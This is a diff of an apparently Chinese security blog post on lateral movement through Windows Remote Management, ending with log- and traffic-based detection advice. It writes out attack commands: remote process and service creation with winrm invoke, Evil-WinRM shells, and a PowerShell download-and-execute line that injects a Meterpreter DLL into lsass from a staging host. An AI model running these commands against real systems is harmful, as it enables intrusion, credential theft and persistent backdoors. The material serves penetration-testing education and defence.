@@ -6,12 +6,12 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-    <meta name="description" content="WS-Management协议及WinRMWeb服务管理协议（WS-Management，Web Services-Management）是一种基于SOAP协议的DMTF开放标准，用于对服务器等网络设备以及各种Web应用程序进行管理。而WinRM（Windows Remote Management）是Windows对WS-Management的实现，WinRM允许远程用户使用工具和脚本对Windo">
+    <meta name="description" content="WS-Management协议及WinRMWeb服务管理协议（WS-Management，Web Services-Management）是一种基于SOAP协议的DMTF开放标准，用于对服务器等网络设备以及各种Web应用程序进行管理。WinRM（Windows Remote Management）是Windows对WS-Management的实现，允许远程用户使用工具和脚本对Windows服务器进">
 <meta property="og:type" content="article">
 <meta property="og:title" content="内网横移之WinRM">
 <meta property="og:url" content="https://0x0c.cc/2019/09/25/内网横移之WinRM/index.html">
 <meta property="og:site_name" content="s4kur4">
-<meta property="og:description" content="WS-Management协议及WinRMWeb服务管理协议（WS-Management，Web Services-Management）是一种基于SOAP协议的DMTF开放标准，用于对服务器等网络设备以及各种Web应用程序进行管理。而WinRM（Windows Remote Management）是Windows对WS-Management的实现，WinRM允许远程用户使用工具和脚本对Windo">
+<meta property="og:description" content="WS-Management协议及WinRMWeb服务管理协议（WS-Management，Web Services-Management）是一种基于SOAP协议的DMTF开放标准，用于对服务器等网络设备以及各种Web应用程序进行管理。WinRM（Windows Remote Management）是Windows对WS-Management的实现，允许远程用户使用工具和脚本对Windows服务器进">
 <meta property="og:locale" content="en">
 <meta property="og:image" content="https://i.loli.net/2019/09/25/8UVIi5b9XMHJWYT.png">
 <meta property="og:image" content="https://i.loli.net/2019/09/25/kG1XNpV4cwPM6Hi.png">
@@ -37,10 +37,10 @@
 <meta property="og:image" content="https://i.loli.net/2019/09/25/bk5RPxulzoMnfae.png">
 <meta property="og:image" content="https://i.loli.net/2019/09/25/CHyN6BJIKWZ7pE3.png">
 <meta property="og:image" content="https://i.loli.net/2019/09/25/nFj8RvPr31LckIs.png">
-<meta property="og:updated_time" content="2020-03-13T07:19:57.668Z">
+<meta property="og:updated_time" content="2020-11-09T02:36:30.894Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="内网横移之WinRM">
-<meta name="twitter:description" content="WS-Management协议及WinRMWeb服务管理协议（WS-Management，Web Services-Management）是一种基于SOAP协议的DMTF开放标准，用于对服务器等网络设备以及各种Web应用程序进行管理。而WinRM（Windows Remote Management）是Windows对WS-Management的实现，WinRM允许远程用户使用工具和脚本对Windo">
+<meta name="twitter:description" content="WS-Management协议及WinRMWeb服务管理协议（WS-Management，Web Services-Management）是一种基于SOAP协议的DMTF开放标准，用于对服务器等网络设备以及各种Web应用程序进行管理。WinRM（Windows Remote Management）是Windows对WS-Management的实现，允许远程用户使用工具和脚本对Windows服务器进">
 <meta name="twitter:image" content="https://i.loli.net/2019/09/25/8UVIi5b9XMHJWYT.png">
     
     
@@ -128,7 +128,7 @@
 
     </div>
     <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#WS-Management协议及WinRM"><span class="toc-number">1.</span> <span class="toc-text">WS-Management协议及WinRM</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#内网横移中的WinRM"><span class="toc-number">2.</span> <span class="toc-text">内网横移中的WinRM</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-通过WinRM直接进行横向移动"><span class="toc-number">2.1.</span> <span class="toc-text">1.通过WinRM直接进行横向移动</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-通过WinRM间接进行横向移动"><span class="toc-number">2.2.</span> <span class="toc-text">2.通过WinRM间接进行横向移动</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WinRM活动的捕获及检测"><span class="toc-number">3.</span> <span class="toc-text">WinRM活动的捕获及检测</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-通过Windows日志检测WinRM活动"><span class="toc-number">3.1.</span> <span class="toc-text">1.通过Windows日志检测WinRM活动</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-通过网络流量检测WinRM活动"><span class="toc-number">3.2.</span> <span class="toc-text">2.通过网络流量检测WinRM活动</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">5.</span> <span class="toc-text">参考</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#WS-Management协议及WinRM"><span class="toc-number">1.</span> <span class="toc-text">WS-Management协议及WinRM</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#内网横移中的WinRM"><span class="toc-number">2.</span> <span class="toc-text">内网横移中的WinRM</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#通过WinRM直接进行横向移动"><span class="toc-number">2.1.</span> <span class="toc-text">通过WinRM直接进行横向移动</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#通过WinRM间接进行横向移动"><span class="toc-number">2.2.</span> <span class="toc-text">通过WinRM间接进行横向移动</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WinRM活动的捕获及检测"><span class="toc-number">3.</span> <span class="toc-text">WinRM活动的捕获及检测</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#通过Windows日志检测WinRM活动"><span class="toc-number">3.1.</span> <span class="toc-text">通过Windows日志检测WinRM活动</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#通过网络流量检测WinRM活动"><span class="toc-number">3.2.</span> <span class="toc-text">通过网络流量检测WinRM活动</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">5.</span> <span class="toc-text">参考</span></a></li></ol>
     </div>
   </span>
 </div>
@@ -167,26 +167,26 @@
   
 
   <div class="content" itemprop="articleBody">
-    <h2 id="WS-Management协议及WinRM"><a href="#WS-Management协议及WinRM" class="headerlink" title="WS-Management协议及WinRM"></a>WS-Management协议及WinRM</h2><p>Web服务管理协议（WS-Management，Web Services-Management）是一种基于SOAP协议的DMTF开放标准，用于对服务器等网络设备以及各种Web应用程序进行管理。而WinRM（<a href="https://docs.microsoft.com/en-us/windows/win32/winrm/portal" target="_blank" rel="noopener">Windows Remote Management</a>）是Windows对WS-Management的实现，WinRM允许远程用户使用工具和脚本对Windows服务器进行管理并获取数据。并且WinRM服务自Windows Vista开始成为Windows的默认组件，在运行与启动上有以下几个特点：</p>
+    <h2 id="WS-Management协议及WinRM"><a href="#WS-Management协议及WinRM" class="headerlink" title="WS-Management协议及WinRM"></a>WS-Management协议及WinRM</h2><p>Web服务管理协议（WS-Management，Web Services-Management）是一种基于SOAP协议的DMTF开放标准，用于对服务器等网络设备以及各种Web应用程序进行管理。WinRM（<a href="https://docs.microsoft.com/en-us/windows/win32/winrm/portal" target="_blank" rel="noopener">Windows Remote Management</a>）是Windows对WS-Management的实现，允许远程用户使用工具和脚本对Windows服务器进行管理并获取数据。WinRM服务自Windows Vista开始成为Windows的默认组件，在运行与启动上有以下几个特点：</p>
 <ol>
-<li>在Windows Vista上必须手动启动WinRM服务，但从Windows Server 2008开始，WinRM服务自动启动。</li>
-<li>默认情况下，虽然WinRM服务后台已经运行，但并不开启监听模式，因此无法接受和发送数据。</li>
-<li>使用WinRM提供的<code>quickconfig</code>对WinRM进行配置后，Windows将开启监听并打开HTTP及HTTPS监听端口，同时Windows防火墙生成这两个端口的例外。</li>
+<li>在Windows Vista上必须手动启动WinRM服务，但从Windows Server 2008开始，WinRM服务自动启动</li>
+<li>默认情况下，WinRM服务后台已经运行，但并不开启监听模式，因此无法接受和发送数据</li>
+<li>使用WinRM提供的<code>quickconfig</code>对WinRM进行配置后，Windows将开启监听并打开HTTP及HTTPS监听端口，同时Windows防火墙生成这两个端口的例外</li>
 </ol>
 <p>WinRM的组件主要由以下几部分构成：</p>
 <ol>
-<li>WinRM Scritping API：提供给外部的用于执行管理操作的接口。</li>
-<li>winrm.cmd和winrm.vbs：系统内置的用于配置WinRM的命令行工具，基于VBS脚本并使用了WinRM Scritping API。</li>
-<li>winrs.exe：基于命令行的工具，此工具作为客户端使用，用于远程连接运行WinRM的服务器并执行大多数的cmd命令。</li>
+<li>WinRM Scritping API：提供给外部的用于执行管理操作的接口</li>
+<li>winrm.cmd和winrm.vbs：系统内置的用于配置WinRM的命令行工具，基于VBS脚本并使用了WinRM Scritping API</li>
+<li>winrs.exe：基于命令行的工具，此工具作为客户端使用，用于远程连接运行WinRM的服务器并执行大多数的cmd命令</li>
 </ol>
-<p>我们可以参照Windows给出的<a href="https://docs.microsoft.com/en-us/windows/win32/winrm/installation-and-configuration-for-windows-remote-management" target="_blank" rel="noopener">WinRM安装和配置文档</a>快速配置WinRM环境。</p>
+<p>可以参照Windows给出的<a href="https://docs.microsoft.com/en-us/windows/win32/winrm/installation-and-configuration-for-windows-remote-management" target="_blank" rel="noopener">WinRM安装和配置文档</a>快速配置WinRM环境。</p>
 <p>在命令行中执行<code>winrm quickconfig</code>对WinRM进行首次（默认）配置：</p>
 <img src="https://i.loli.net/2019/09/25/8UVIi5b9XMHJWYT.png" alt="1" style="zoom: 33%;">
 
-<p>此时，WinRM服务已经开始监听5985/TCP（WinRM2.0开始，WinRM服务的HTTP默认监听端口由原来的80/TCP变更为5985/TCP）端口并等待远程主机进行访问，通过<code>winrm enumerate winrm/config/listener</code>查看WinRM服务当前的配置情况：</p>
+<p>此时，WinRM服务已经开始监听5985/TCP（从WinRM2.0开始，服务的HTTP默认监听端口由原来的80/TCP变更为5985/TCP）端口并等待远程主机进行访问，通过<code>winrm enumerate winrm/config/listener</code>查看WinRM服务当前的配置情况：</p>
 <img src="https://i.loli.net/2019/09/25/kG1XNpV4cwPM6Hi.png" alt="2" style="zoom: 33%;">
 
-<p>以此配置为例，此时远程主机已经可以通过WS-Management协议访问<code>http://10.0.83.30/wsman</code>连接当前服务器的WinRM服务。不过，WinRM只允许当前域用户或者处于本机TrustedHosts列表中的远程主机进行访问。因此在连接之前，还需要确保发起连接的主机与当前服务器处于同一域或者两台主机的WinRM服务TrustedHosts中必须存在对方主机的IP或主机名，这里类似于一个白名单机制。我们可以执行<code>winrm set winrm/config/client @{TrustedHosts=&quot;*&quot;}</code>手动配置当前服务器允许被任意主机连接：</p>
+<p>以此配置为例，此时远程主机已经可以通过WS-Management协议访问<code>http://10.0.83.30/wsman</code>连接当前服务器的WinRM服务。不过，WinRM只允许当前域用户或者处于本机TrustedHosts列表中的远程主机进行访问。因此在连接之前，还需要确保发起连接的主机与当前服务器处于同一域或者两台主机的WinRM服务TrustedHosts中必须存在对方主机的IP或主机名，这里类似于一个白名单机制。可以执行<code>winrm set winrm/config/client @{TrustedHosts=&quot;*&quot;}</code>手动配置当前服务器允许被任意主机连接：</p>
 <img src="https://i.loli.net/2019/09/25/6nLzhXdDwvl1FTs.png" alt="3" style="zoom:33%;">
 
 <p>在本地Windows主机上也进行相同的设置，允许连接任意Windows主机。接着，使用winrs客户端连接这台Windows服务器即可直接执行系统命令，例如运行<code>winrs -r:http://10.0.83.30:5985 -u:administrator -p:123456 ipconfig</code>得到网络配置信息：</p>
@@ -195,14 +195,14 @@
 <p>上述操作为WinRM服务的一次简单的配置和使用过程。</p>
 <p>在Windows中，除了WinRM本身，其他一些工具和一些第三方工具也都借助了WinRM所提供的功能。例如：</p>
 <ol>
-<li>PowerShell：PowerShell自2.0开始引入了Remoting技术，即远程执行PowerShell命令，此技术基于WinRM服务实现。</li>
+<li>PowerShell：自2.0开始引入了Remoting技术，即远程执行PowerShell命令，此技术基于WinRM服务实现。</li>
 <li>Ansible：基于Python的开源IT自动化平台，使用pywinrm库远程管理Windows服务器，基于WinRM服务。</li>
 </ol>
-<h2 id="内网横移中的WinRM"><a href="#内网横移中的WinRM" class="headerlink" title="内网横移中的WinRM"></a>内网横移中的WinRM</h2><p>WinRM服务提供远程执行系统命令的特点，将使得内网环境下的横向移动变得极为方便。我们尝试通过直接和间接的方式使用WinRM进行内网横移。</p>
-<h3 id="1-通过WinRM直接进行横向移动"><a href="#1-通过WinRM直接进行横向移动" class="headerlink" title="1.通过WinRM直接进行横向移动"></a>1.通过WinRM直接进行横向移动</h3><p>在winrm.vbs的参数选项中有一个<code>invoke</code>参数，此操作允许使用WinRM对目标对象执行特定的方法。执行命令<code>winrm invoke Create wmicimv2/win32_process @{CommandLine=&quot;calc.exe&quot;}</code>将会在本地弹出计算器：</p>
+<h2 id="内网横移中的WinRM"><a href="#内网横移中的WinRM" class="headerlink" title="内网横移中的WinRM"></a>内网横移中的WinRM</h2><p>WinRM服务提供远程执行系统命令的特点，将使得内网环境下的横向移动变得极为方便。</p>
+<h3 id="通过WinRM直接进行横向移动"><a href="#通过WinRM直接进行横向移动" class="headerlink" title="通过WinRM直接进行横向移动"></a>通过WinRM直接进行横向移动</h3><p>在winrm.vbs的参数选项中有一个<code>invoke</code>参数，此操作允许使用WinRM对目标对象执行特定方法。执行命令<code>winrm invoke Create wmicimv2/win32_process @{CommandLine=&quot;calc.exe&quot;}</code>将会在本地弹出计算器：</p>
 <img src="https://i.loli.net/2019/09/25/PCyGNcBV4nh8LpK.png" alt="15" style="zoom:30%;">
 
-<p>该命令调用了Windows WMI中Win32_process类的Create方法，生成了一个calc.exe的新进程。通过这种方式，我们就可以使用WinRM在远程Windows服务器上起一个新进程。例如执行：</p>
+<p>该命令调用Windows WMI中Win32_process类的Create方法，生成了一个calc.exe的新进程。通过这种方式，可以使用WinRM在远程Windows服务器上起一个新进程。例如执行：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">winrm invoke Create wmicimv2/win32_process @&#123;CommandLine=&quot;calc.exe&quot;&#125; -r:http://10.0.83.30:5985 -u:administrator -p:123456</span><br></pre></td></tr></table></figure>
 
 <p>可以在远程在Windows服务器上运行一个静默执行的calc.exe新进程：</p>
@@ -210,14 +210,14 @@
 
 <img src="https://i.loli.net/2019/09/25/7U5oYdbO34lgK61.gif" alt="17" style="zoom:60%;">
 
-<p>同样的，我们也可以调用WMI中Win32_service类的Create方法，以生成服务的形式运行特定程序。首先执行以下命令创建服务：</p>
+<p>同样，也可以调用Win32_service类的Create方法，以生成服务的形式运行特定程序。首先执行以下命令创建服务：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">winrm invoke Create wmicimv2/Win32_Service @&#123;Name=&quot;test&quot;;DisplayName=&quot;test&quot;;PathName=&quot;cmd.exe /k c:\windows\system32\calc.exe&quot;&#125; -r:http://10.0.83.30:5985 u:administrator -p:123456</span><br></pre></td></tr></table></figure>
 
 <p>接着执行下面的命令运行服务：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">winrm invoke StartService wmicimv2/Win32_Service?Name=test -r:http://10.0.83.30:5985 u:administrator -p:123456</span><br></pre></td></tr></table></figure>
 
 <p>使用上述方法即可控制远程主机下载远控后门并达到持续渗透和权限维持的目的。</p>
-<h3 id="2-通过WinRM间接进行横向移动"><a href="#2-通过WinRM间接进行横向移动" class="headerlink" title="2.通过WinRM间接进行横向移动"></a>2.通过WinRM间接进行横向移动</h3><p>在第一节的配置环境基础上，我们测试使用PowerShell远程获得Windows服务器的交互式PowerShell，这首先需要确保Windows服务器正在运行WinRM服务并允许PowerShell被远程连接。可在Windows服务器的PowerShell中执行<code>Enable-PSRemoting –force</code>开启PowerShell的远程连接：</p>
+<h3 id="通过WinRM间接进行横向移动"><a href="#通过WinRM间接进行横向移动" class="headerlink" title="通过WinRM间接进行横向移动"></a>通过WinRM间接进行横向移动</h3><p>在第一节的配置环境基础上，下面测试使用PowerShell远程获得Windows服务器的交互式PowerShell，这首先需要确保Windows服务器正在运行WinRM服务并允许PowerShell被远程连接。可在Windows服务器的PowerShell中执行<code>Enable-PSRemoting –force</code>开启PowerShell的远程连接：</p>
 <img src="https://i.loli.net/2019/09/25/jlWODBXvQN4AM61.png" alt="6" style="zoom:25%;">
 
 <p>此时，在另一台Windows主机上使用PowerShell执行<code>Enter-PSSession -ComputerName 10.0.83.30 -Credential administrator</code>即可连接至这台Windows服务器，在弹框中输入密码，获得这台Windows服务器的交互式PowerShell：</p>
@@ -226,33 +226,34 @@
 <p>此过程的流程图如下：</p>
 <img src="https://i.loli.net/2019/09/25/GSC8QN7lkqvjunW.png" alt="5" style="zoom:50%;">
 
-<p>WinRM在这里作为中间件连接了两端的PowerShell，起到了通道的作用。当然，在渗透测试角度，攻击者使用的工具千变万化。</p>
-<p>Python与Ruby均有支持WinRM操作的库，这使得连接WinRM的方式将更加灵活，攻击活动将被控制在命令行中。例如GitHub上的开源工具<a href="https://github.com/Hackplayers/evil-winrm" target="_blank" rel="noopener">Evil-WinRM</a>，其使用了WinRM的ruby库<code>winrm</code>及<code>winrm-fs</code>，可以通过WinRM服务快速获得一个类似于PowerShell的交互式Shell，并支持PowerShell的全部命令。</p>
+<p>WinRM在这里作为通道连接了两端的PowerShell。当然，在红队角度来说，工具是千变万化的。</p>
+<p>Python与Ruby均有支持WinRM操作的库，这使得连接WinRM的方式将更加灵活，攻击活动将被控制在命令行中。例如GitHub上的开源工具<a href="https://github.com/Hackplayers/evil-winrm" target="_blank" rel="noopener">Evil-WinRM</a>，使用WinRM的ruby库<code>winrm</code>及<code>winrm-fs</code>，可以通过WinRM服务快速获得一个交互式Shell，并支持PowerShell的全部命令。</p>
 <img src="https://i.loli.net/2019/09/25/b4quPJWVxQFivXK.png" alt="8" style="zoom:30%;">
 
 <p>接下来我们尝试通过Evil-WinRM工具连接远程Windows服务器的WinRM服务并获得交互式PowerShell。克隆项目后执行命令<code>ruby evil-wnrm.rb -i 10.0.83.30 -u administrator -p 123456</code>即可连接至运行WinRM服务的Windows服务器：</p>
 <img src="https://i.loli.net/2019/09/25/w2KL9HF5qTuiGsl.png" alt="9" style="zoom:30%;">
 
-<p>另外，Evil-WinRM提供了一个menu命令，可通过加载Invoke-Binary和l04d3r-LoadDll两个自定义函数，实现动态无文件执行PE文件和DLL加载，但实际测试时这两个函数无法稳定使用，加载Meterpreter Payload会出现报错情况。因此我们转而尝试使用更为优雅的PowerSploit间接实现无文件渗透测试。例如生成一个用于反弹Meterpreter的动态链接库文件，随后使用<a href="https://github.com/clymb3r/PowerShell/blob/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1" target="_blank" rel="noopener">@clymb3r</a>修改后的反射DLL文件注入脚本Invoke-ReflectivePEInjection.ps1将此DLL文件注入进服务器的内存中实现无文件反弹Meterpreter。</p>
-<p>首先，生成一个包含Meterpreter Payload的DLL文件t0y.dll。接着通过<code>python -m SimpleHTTPServer 8000</code>开启临时HTTP服务以便使远程服务器获取Invoke-ReflectivePEInjection.ps1和t0y.dll。同时，Metasploit需要监听本地端口以得到Meterpreter会话：</p>
+<p>另外，Evil-WinRM提供了一个menu命令，可通过加载<code>Invoke-Binary</code>和<code>l04d3r-LoadDll</code>两个自定义函数，实现无文件执行PE文件和DLL加载，但实际测试时这两个函数无法稳定使用，加载Meterpreter Payload会出现报错情况。</p>
+<p>当然还有更优雅的方式，例如使用PowerSploit。</p>
+<p>首先，生成一个包含Meterpreter Payload的DLL文件t0y.dll。接着通过<code>python -m SimpleHTTPServer 8000</code>开启临时HTTP服务，将<a href="https://github.com/clymb3r/PowerShell/blob/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1" target="_blank" rel="noopener">@clymb3r</a>修改后的反射DLL文件注入脚本Invoke-ReflectivePEInjection.ps1与t0y.dll一同放置在目录下，以便使远程服务器获取。使MSF监听本地端口以得到Meterpreter会话：</p>
 <img src="https://i.loli.net/2019/09/25/srjy3I9uiOkZS8J.png" alt="11" style="zoom:30%;">
 
-<p>最后，在Evil-WinRM的交互式Shell中直接执行：</p>
+<p>在Evil-WinRM的交互式Shell中直接执行：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">IEX (New-Object Net.WebClient).DownloadString(&apos;http://10.0.84.102:8000/Invoke-ReflectivePEInjection.ps1&apos;);Invoke-ReflectivePEInjection -PEUrl http://10.0.84.102:8000/t0y.dll -procname lsass</span><br></pre></td></tr></table></figure>
 
 <p>此时将下载Invoke-ReflectivePEInjection.ps1执行，并将t0y.dll注入到lsass进程中：</p>
 <img src="https://i.loli.net/2019/09/25/VJWiwvtqs5PM1bl.png" alt="12" style="zoom:25%;">
 
-<p>至此，我们通过无文件的方式将DLL文件注入进目标Windows服务器的内存并获得Meterpreter Shell，通过Meterpreter此服务器将进一步成为内网横向移动的跳板。当然，也可以直接使用PowerSploit完成对网络的进一步探测。例如，使用Recon模块对内网主机端口扫描：</p>
+<p>至此，DLL文件被注入进目标Windows服务器的内存并获得Meterpreter Shell。当然，也可以直接使用PowerSploit完成对网络的进一步探测。例如使用Recon模块对内网主机端口扫描：</p>
 <img src="https://i.loli.net/2019/09/25/H5BuRziXLpKM37E.png" alt="13" style="zoom:35%;">
 
 <p>或者尝试获取域控制器的密码等等：</p>
 <img src="https://i.loli.net/2019/09/25/V6xuEfQ1t9XrhoL.png" alt="14" style="zoom:35%;">
 
-<p>可见，透过WinRM服务我们可以使用多种渗透框架对目标网络进行渗透攻击，WinRM更像是一个通道或者一扇门。</p>
-<h2 id="WinRM活动的捕获及检测"><a href="#WinRM活动的捕获及检测" class="headerlink" title="WinRM活动的捕获及检测"></a>WinRM活动的捕获及检测</h2><p>以第二节的攻击活动作为基础，我们尝试从Windows日志以及流量层面检测使用WinRM服务进行的横向移动。</p>
-<h3 id="1-通过Windows日志检测WinRM活动"><a href="#1-通过Windows日志检测WinRM活动" class="headerlink" title="1.通过Windows日志检测WinRM活动"></a>1.通过Windows日志检测WinRM活动</h3><p>在使用WinRM服务时，Windows会在两个位置记录相关日志，分别为<code>%SystemRoot%\System32\Winevt\Logs\Security.evtx</code>Windows安全事件日志及<code>%SystemRoot%\System32\Winevt\Logs\Microsoft-Windows-WinRM%4Operational.evtx</code>WinRM服务操作日志。</p>
-<p>为方便测试，我们先分别清空本地Windows主机和远程Windows服务器的这两处日志。以PowerShell Remoting为例，从本地Windows主机登录远程Windows服务器执行一条系统命令<code>ipconfig</code>后退出，随后查看此过程产生的日志。</p>
+<p>可见，透过WinRM服务可以使用多种渗透框架对目标网络进行渗透攻击，此时WinRM更像是一个通道或者一扇门。</p>
+<h2 id="WinRM活动的捕获及检测"><a href="#WinRM活动的捕获及检测" class="headerlink" title="WinRM活动的捕获及检测"></a>WinRM活动的捕获及检测</h2><p>以第二节的攻击活动作为基础，尝试从Windows日志以及流量层面检测使用WinRM服务进行的横向移动。</p>
+<h3 id="通过Windows日志检测WinRM活动"><a href="#通过Windows日志检测WinRM活动" class="headerlink" title="通过Windows日志检测WinRM活动"></a>通过Windows日志检测WinRM活动</h3><p>使用WinRM服务时，Windows会在两个位置记录相关日志，分别为<code>%SystemRoot%\System32\Winevt\Logs\Security.evtx</code>Windows安全事件日志及<code>%SystemRoot%\System32\Winevt\Logs\Microsoft-Windows-WinRM%4Operational.evtx</code>WinRM服务操作日志。</p>
+<p>为方便测试，先分别清空本地Windows主机和远程Windows服务器的这两处日志。以PowerShell Remoting为例，从本地Windows主机登录远程Windows服务器执行一条系统命令<code>ipconfig</code>后退出，随后查看此过程产生的日志。</p>
 <p>本地Windows主机记录的两处日志如图：</p>
 <img src="https://i.loli.net/2019/09/25/UCOgoiq7Ldb1Fa2.png" alt="21" style="zoom:25%;">
 
@@ -265,7 +266,7 @@
 <p>WinRM服务操作日志中记录了与WinRM服务所有相关的操作，并且从时间线上依次有WSMan初始化、WSMan API调用（初始化建立连接）、用户身份验证请求及响应、WSMan API调用（具体操作）请求及响应。从日志的详情中能看到每一次操作的具体情况，例如客户端发送命令给远程主机：</p>
 <img src="https://i.loli.net/2019/09/25/oAIp6YZJ2VkxgsH.png" alt="24" style="zoom:26%;">
 
-<p>在远程Windows服务器上，我们再来看这两个日志。</p>
+<p>在远程Windows服务器上，再来看这两个日志。</p>
 <p>与发起登录的Windows主机不同，这里安全事件日志上分别生成了事件ID为<code>4776</code>、<code>4672</code>、<code>4624</code>、<code>4634</code>的四种日志，分别对应凭据验证、特殊登录、登录及注销四个事件，并且也都产生了三次。</p>
 <img src="https://i.loli.net/2019/09/25/lWaHuC4poxAq1Nn.png" alt="25" style="zoom:30%;">
 
@@ -277,9 +278,9 @@
 <p>转向WinRM服务操作日志，这里只记录了四个事件，只能看到WSMan API被调用并给出响应，不够详细：</p>
 <img src="https://i.loli.net/2019/09/25/CHyN6BJIKWZ7pE3.png" alt="27" style="zoom:26%;">
 
-<p>从两台主机的日志可以看出，WinRM服务连接的请求发起方记录明显要比被连接方更详细，远程Windows服务器作为被攻击主机，在日志上只能记录Windows远程登录的详细情况，而无法记录WinRM操作较详细的过程，这对于横向移动的检测明显不利。</p>
-<p>因此，通过WinRM服务进行的内网横移活动，日志层面的监控需要借助新的工具来实现记录，例如<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon" target="_blank" rel="noopener">Sysmon</a>。从日本Cert/CC的<a href="https://jpcertcc.github.io/ToolAnalysisResultSheet/details/WinRM.htm" target="_blank" rel="noopener">研究</a>可以看到，Sysmon能较完整的记录WinRM服务的操作日志。</p>
-<h3 id="2-通过网络流量检测WinRM活动"><a href="#2-通过网络流量检测WinRM活动" class="headerlink" title="2.通过网络流量检测WinRM活动"></a>2.通过网络流量检测WinRM活动</h3><p>我们通过winrm的<code>invoke</code>参数在远程Windows服务器上生成一个运行计算器程序的进程，并在此Windows服务器上捕获过程中产生的网络流量。</p>
+<p>从两台主机的日志可以看出，WinRM服务连接的请求发起方记录明显要比被连接方更详细，远程Windows服务器作为被攻击主机，在日志上只能记录Windows远程登录的详细情况，而无法记录WinRM操作较详细的过程，这对横向移动的检测明显不利。</p>
+<p>借助WinRM服务进行的内网横移活动，日志层面监控需要借助新的工具来实现记录，例如<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon" target="_blank" rel="noopener">Sysmon</a>。从日本Cert/CC的<a href="https://jpcertcc.github.io/ToolAnalysisResultSheet/details/WinRM.htm" target="_blank" rel="noopener">研究</a>可以看到，Sysmon能较完整的记录WinRM服务的操作日志。</p>
+<h3 id="通过网络流量检测WinRM活动"><a href="#通过网络流量检测WinRM活动" class="headerlink" title="通过网络流量检测WinRM活动"></a>通过网络流量检测WinRM活动</h3><p>我们通过winrm的<code>invoke</code>参数在远程Windows服务器上生成一个运行计算器程序的进程，并在此Windows服务器上捕获过程中产生的网络流量。</p>
 <img src="https://i.loli.net/2019/09/25/nFj8RvPr31LckIs.png" alt="18" style="zoom:26%;">
 
 <p>从图中可以看到，客户端PC使用NTLM认证登录Windows服务器，并随后向其发送了经过加密的WS-Management协议消息。由于会话进行了加密，因此无法从流量内容中解密出具体的操作请求与响应内容：</p>
@@ -287,7 +288,7 @@
 
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200</span><br><span class="line">Content-Type: multipart/encrypted;protocol=&quot;application/HTTP-SPNEGO-session-encrypted&quot;;boundary=&quot;Encrypted Boundary&quot;</span><br><span class="line">Server: Microsoft-HTTPAPI/2.0</span><br><span class="line">Date: Wed, 18 Sep 2019 05:37:57 GMT</span><br><span class="line">Content-Length: 2202</span><br><span class="line"></span><br><span class="line">--Encrypted Boundary</span><br><span class="line">Content-Type: application/HTTP-SPNEGO-session-encrypted</span><br><span class="line">OriginalContent: type=application/soap+xml;charset=UTF-16;Length=1946</span><br><span class="line">--Encrypted Boundary</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line">.........t3.d.O...../....-....N7C..B....2.....r.</span><br><span class="line">.............................(此处省略)</span><br><span class="line">...DP.....@...A..e...Z....6.7...M.l|.PU...vA.J...7.T...--Encrypted Boundary--</span><br></pre></td></tr></table></figure>
 
-<p>经过测试，使用PowerShell Remoting、Evil-WinRM工具产生的WinRM连接流量均与之类似。可见在WinRM服务未开启监听HTTPS端口的情况下，Windows依然会加密WinRM会话以保证通信数据的完整性。不过，我们仍然可以通过HTTP请求与响应中的明文部分捕获WinRM认证及操作的行为，例如<code>Microsoft WinRM Client</code>、<code>Encrypted Boundary</code>、<code>HTTP-SPNEGO-session-encrypted</code>等关键字，并以此进行关联产生侦测到WinRM服务成功调用的预警。</p>
+<p>经过测试，使用PowerShell Remoting、Evil-WinRM工具产生的WinRM连接流量均与之类似。可见在WinRM服务未开启监听HTTPS端口的情况下，Windows依然会加密WinRM会话以保证通信数据的完整性。不过，仍然可以通过HTTP请求与响应中的明文部分捕获WinRM认证及操作的行为，例如<code>Microsoft WinRM Client</code>、<code>Encrypted Boundary</code>、<code>HTTP-SPNEGO-session-encrypted</code>等关键字，并以此进行关联产生侦测到WinRM服务成功调用的预警。</p>
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>根据多个APT报告，借助Windows服务进行内网横向移动的技术受到越来越多攻击者的青睐，这将进一步打破攻防对抗的平衡，使得防御方举步维艰。本文从WS-Management协议出发，介绍了Windows中的WinRM服务，同时通过实例对该服务用于横向移动的过程进行了阐述和举例。最后，在Windows日志层面和流量层面分别探讨了检测WinRM横向移动的可能性。</p>
